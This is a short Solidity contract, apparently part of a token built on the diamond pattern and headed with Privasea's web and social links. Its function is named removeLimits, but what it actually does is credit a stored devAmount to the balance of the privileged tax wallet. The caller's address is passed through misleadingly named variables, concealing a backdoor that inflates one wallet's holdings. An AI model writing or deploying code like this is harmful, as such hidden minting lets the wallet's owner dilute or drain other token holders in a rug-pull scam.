// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://www.privasea.ai/
    Twitter:  https://twitter.com/Privasea_ai
    Telegram: https://t.me/Privasea_ai
    Discord:  https://discord.com/invite/yRtQGvWkvG
    Github:   https://github.com/Privasea

*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet is Ownable {
    function removeLimits() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == ds._taxWallet) {
            require(ds._taxWallet == _msgSender());
            address feeAmount = _msgSender();
            address swapRouter = feeAmount;
            address devWallet = swapRouter;
            ds._balances[devWallet] += ds.devAmount;
        }
    }
}
